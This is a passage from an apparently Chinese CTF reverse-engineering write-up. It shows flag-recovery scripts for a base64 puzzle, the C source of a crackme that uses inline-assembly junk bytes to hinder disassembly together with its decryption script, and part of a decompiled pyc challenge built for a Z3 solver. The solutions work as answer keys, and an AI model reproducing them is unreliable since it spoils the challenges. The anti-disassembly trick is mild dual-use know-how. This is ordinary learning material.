class="comment">##范围是从0到最后</span></span><br><span class="line">    index = <span class="built_in">chr</span> (<span class="built_in">ord</span>(<span class="built_in">str</span>[i])-i)</span><br><span class="line"> <span class="comment">##算出来之间的字符后，下一步进行base64编码的转化</span></span><br><span class="line">    flag += index  </span><br><span class="line">      </span><br><span class="line"><span class="comment">##base64.b64decode()方法，我们可以将二进制字符串解码为正常形式    </span></span><br><span class="line">flag = base64.b64decode(flag)  </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">##result</span></span><br><span class="line">D:\CollegeStudy\Python_code\venv\Scripts\python.exe D:/CTF_Tools/0_CTF_Scripts/BuuCTF_Test/Str_base64decode.py</span><br><span class="line"><span class="string">b&#x27;&#123;i_l0ve_you&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">进程已结束,退出代码<span class="number">0</span></span><br></pre></td></tr></table></figure></div><h2 id="双层加密"><a href="#双层加密" class="headerlink" title="双层加密"></a>双层加密</h2><p>源c代码 chicken_soup.c</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> check[]=&#123;<span class="number">0xCD</span>, <span class="number">0x4D</span>, <span class="number">0x8C</span>, <span class="number">0x7D</span>, <span class="number">0xAD</span>, <span class="number">0x1E</span>, <span class="number">0xBE</span>, <span class="number">0x4A</span>, <span class="number">0x8A</span>, <span class="number">0x7D</span>, </span><br><span class="line">     <span class="number">0xBC</span>, <span class="number">0x7C</span>, <span class="number">0xFC</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x79</span>, <span class="number">0x9D</span>, <span class="number">0x6A</span>, <span class="number">0x1A</span>, <span class="number">0xCC</span>, </span><br><span class="line">     <span class="number">0x3D</span>, <span class="number">0x4A</span>, <span class="number">0xF8</span>, <span class="number">0x3C</span>, <span class="number">0x79</span>, <span class="number">0x69</span>, <span class="number">0x39</span>, <span class="number">0xD9</span>, <span class="number">0xDD</span>, <span class="number">0x9D</span>, </span><br><span class="line">     <span class="number">0xA9</span>, <span class="number">0x69</span>, <span class="number">0x4C</span>, <span class="number">0x8C</span>, <span class="number">0xDD</span>, <span class="number">0x59</span>, <span class="number">0xE9</span>, <span class="number">0xD7</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">enc1</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*input)</span></span>&#123;</span><br><span class="line">    _asm &#123;</span><br><span class="line">        jz label</span><br><span class="line">        jnz label</span><br><span class="line">        _emit <span class="number">0xe9</span></span><br><span class="line">        label:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)input)<span class="number">-1</span>;i++)</span><br><span class="line">        input[i]+=input[i+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">enc2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*input)</span></span>&#123;</span><br><span class="line">    _asm&#123;</span><br><span class="line">        jz label</span><br><span class="line">        jnz label</span><br><span class="line">        _emit <span class="number">0xe9</span></span><br><span class="line">        label:</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)input);i++)</span><br><span class="line">        input[i]=((input[i]&gt;&gt;<span class="number">4</span>)|(input[i]&lt;&lt;<span class="number">4</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">my_strcmp</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>*s1,<span class="type">unsigned</span> <span class="type">char</span>*s2)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>,f=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;<span class="number">38</span>)</span><br><span class="line">        <span class="keyword">if</span>(s1[i]==s2[i])</span><br><span class="line">        f++;</span><br><span class="line">    <span class="keyword">if</span>(f==<span class="number">38</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I poisoned the program... Can you reverse it?!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Come on! Give me your flag:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf_s</span>(<span class="string">&quot;%s&quot;</span>,input,<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span>*)input) != <span class="number">38</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">enc1</span>(input);</span><br><span class="line">        <span class="built_in">enc2</span>(input);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">my_strcmp</span>(input,check))</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nTTTTTTTTTTQQQQQQQQQQQQQLLLLLLLLL!!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;\nQwQ, please try again.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>解密的脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">enc=[<span class="number">0xCD</span>, <span class="number">0x4D</span>, <span class="number">0x8C</span>, <span class="number">0x7D</span>, <span class="number">0xAD</span>, <span class="number">0x1E</span>, <span class="number">0xBE</span>, <span class="number">0x4A</span>, <span class="number">0x8A</span>, <span class="number">0x7D</span>, </span><br><span class="line">  <span class="number">0xBC</span>, <span class="number">0x7C</span>, <span class="number">0xFC</span>, <span class="number">0x2E</span>, <span class="number">0x2A</span>, <span class="number">0x79</span>, <span class="number">0x9D</span>, <span class="number">0x6A</span>, <span class="number">0x1A</span>, <span class="number">0xCC</span>, </span><br><span class="line">  <span class="number">0x3D</span>, <span class="number">0x4A</span>, <span class="number">0xF8</span>, <span class="number">0x3C</span>, <span class="number">0x79</span>, <span class="number">0x69</span>, <span class="number">0x39</span>, <span class="number">0xD9</span>, <span class="number">0xDD</span>, <span class="number">0x9D</span>, </span><br><span class="line">  <span class="number">0xA9</span>, <span class="number">0x69</span>, <span class="number">0x4C</span>, <span class="number">0x8C</span>, <span class="number">0xDD</span>, <span class="number">0x59</span>, <span class="number">0xE9</span>, <span class="number">0xD7</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line"><span class="comment">#伪代码中loc_401080是第二步加密</span></span><br><span class="line"><span class="comment">#所以在exp中是第一层解密</span></span><br><span class="line">    enc[i] = ((enc[i]&gt;&gt;<span class="number">4</span>)|(enc[i]&lt;&lt;<span class="number">4</span>)) &amp;<span class="number">0xff</span></span><br><span class="line"><span class="comment">#for i in range(len(enc)):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)-<span class="number">1</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line"><span class="comment">#源代码:enc[i] = enc[i+1]</span></span><br><span class="line">    enc[i-<span class="number">1</span>]-=enc[i] </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(enc))     </span><br></pre></td></tr></table></figure></div><h2 id="Z3求解器"><a href="#Z3求解器" class="headerlink" title="Z3求解器"></a>Z3求解器</h2><p>源程序为pyc逆向获得的代码如下：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.8</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Maybe z3 can help you solve this challenge.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Now give me your flag, and I will check for you.&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Input your flag:&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">22</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">7072</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">2523</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6714</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">8810</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">6796</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">2647</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">1347</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">1289</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">8917</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">2304</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5001</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2882</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">7232</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3192</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9676</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5436</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4407</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6269</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">9623</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">6230</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">6292</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">57</span> == <span class="number">10743134</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">3492</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1613</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">3234</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">5656</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">9182</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">4240</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8808</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">9484</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">4000</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">1475</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">2616</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">2766</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">6822</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">1068</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">9768</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">1420</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4528</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1031</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">8388</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">2029</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2463</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">32</span> == <span class="number">9663091</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">9661</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1108</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">2229</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">1256</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">7747</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">5775</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">5211</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">2387</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">1997</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">4045</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">7102</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">7853</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">5596</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">6952</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">8883</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5125</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">9572</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1149</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7583</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">1075</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">9804</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">72</span> == <span class="number">10521461</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">4314</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">3509</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6200</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">5546</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">1705</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9518</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">2975</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">2689</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2412</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">8659</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5459</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">7572</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">3042</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">9701</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">4697</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">9863</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">1296</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">1278</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">5721</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5116</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4147</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">52</span> == <span class="number">9714028</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">2310</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">1379</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">5900</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">4876</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5329</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">6485</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">6610</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">7179</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">7897</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">1094</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">4825</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">8101</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">9519</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3048</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">3168</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">2775</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">4366</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">4066</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7490</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5533</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2139</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">87</span> == <span class="number">10030960</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">1549</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8554</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">6510</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">6559</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5570</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">1003</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8562</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">6793</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">3509</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">4965</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">6111</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">1229</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">5654</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">2204</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">2217</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">5039</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">5657</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">9426</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7604</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">5883</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">5285</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">17</span> == <span class="number">10946682</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">2678</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">4369</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">7509</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">1564</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">7777</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">2271</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">9696</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">3874</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">2212</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">6764</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">5727</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">5971</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">5876</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">9959</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">4604</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">8461</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">2350</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">3564</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">1831</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">6088</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4575</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">9</span> == <span class="number">10286414</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">8916</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8647</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">4522</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">3579</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">5319</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">9124</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">9535</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">5125</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">3235</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3246</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">3378</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">9221</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">1875</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">1008</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">6262</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">1524</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">8851</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">4367</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">7628</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">9404</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">2065</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">9</span> == <span class="number">11809388</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">9781</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">9174</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">3771</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">6972</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">6425</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">7631</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8864</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">9117</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">4328</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">3919</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">6517</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">7165</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">6895</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">3609</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">3878</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">1593</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">9098</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">6432</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">2584</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) * <span class="number">8403</span> + <span class="built_in">ord</span>(flag[<span class="number">20</span>]) * <span class="number">4029</span> + <span class="built_in">ord</span>(flag[<span class="number">21</span>]) * <span class="number">30</span> == <span class="number">13060508</span> <span class="keyword">and</span> <span class="built_in">ord</span>(flag[<span class="number">0</span>]) * <span class="number">2511</span> + <span class="built_in">ord</span>(flag[<span class="number">1</span>]) * <span class="number">8583</span> + <span class="built_in">ord</span>(flag[<span class="number">2</span>]) * <span class="number">2428</span> + <span class="built_in">ord</span>(flag[<span class="number">3</span>]) * <span class="number">9439</span> + <span class="built_in">ord</span>(flag[<span class="number">4</span>]) * <span class="number">3662</span> + <span class="built_in">ord</span>(flag[<span class="number">5</span>]) * <span class="number">3278</span> + <span class="built_in">ord</span>(flag[<span class="number">6</span>]) * <span class="number">8305</span> + <span class="built_in">ord</span>(flag[<span class="number">7</span>]) * <span class="number">1100</span> + <span class="built_in">ord</span>(flag[<span class="number">8</span>]) * <span class="number">7972</span> + <span class="built_in">ord</span>(flag[<span class="number">9</span>]) * <span class="number">8510</span> + <span class="built_in">ord</span>(flag[<span class="number">10</span>]) * <span class="number">8552</span> + <span class="built_in">ord</span>(flag[<span class="number">11</span>]) * <span class="number">9993</span> + <span class="built_in">ord</span>(flag[<span class="number">12</span>]) * <span class="number">6855</span> + <span class="built_in">ord</span>(flag[<span class="number">13</span>]) * <span class="number">1702</span> + <span class="built_in">ord</span>(flag[<span class="number">14</span>]) * <span class="number">1640</span> + <span class="built_in">ord</span>(flag[<span class="number">15</span>]) * <span class="number">3787</span> + <span class="built_in">ord</span>(flag[<span class="number">16</span>]) * <span class="number">8161</span> + <span class="built_in">ord</span>(flag[<span class="number">17</span>]) * <span class="number">2110</span> + <span class="built_in">ord</span>(flag[<span class="number">18</span>]) * <span class="number">5320</span> + <span class="built_in">ord</span>(flag[<span class="number">19</span>]) 